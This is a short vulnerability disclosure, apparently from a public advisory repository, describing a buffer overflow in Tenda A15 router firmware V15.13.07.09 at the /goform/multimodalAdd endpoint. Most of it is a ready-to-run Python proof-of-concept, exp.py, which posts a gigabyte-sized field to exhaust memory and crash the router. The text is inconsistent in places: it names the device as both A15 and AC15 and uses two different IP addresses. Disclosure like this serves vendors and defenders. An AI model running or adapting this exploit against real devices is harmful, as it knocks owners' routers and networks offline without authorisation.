# Tenda A15 V15.13.07.09 has a buffer overflow vulnerability

## Vulnerable URL
http://192.168.159.128/goform/multimodalAdd

Vulnerability Description
Tenda A15 is a dual-band three-gigabit wireless router suitable for fiber-optic homes within 1000 megabits, supporting gigabit ports, intelligent frequency selection, parental control and other functions. 
Shenzhen Jixiang Tenda Technology Co., Ltd. AC15 has a binary vulnerability that can be exploited by attackers to cause a denial of service.

Payload：

exp.py
```
import requests

url = "http://192.168.85.160/goform/multimodalAdd"
data = {
    "HTTP/1.1 200 OK\r\nContent-Length:%d\r\nContent-type: text/plain; charset=utf-8\r\nPrag ma: no-cache\r\nCache-Control: no-cache\r\n\r\n":b'A'*1000000000
}
res = requests.post(url=url,data=data)
print(res.content)
```
<img width="547" alt="image" src="https://github.com/user-attachments/assets/45a9e8b6-fa53-49c5-87a3-8db9b98615d0" />

When running the exp.py script, the memory is filled up and the device crashes.

<img width="640" alt="image" src="https://github.com/user-attachments/assets/7d3cf699-7f4a-4e23-b712-5353991aa4aa" />

![image](https://github.com/user-attachments/assets/8382d7c2-84d5-4927-adab-f06426183bed)
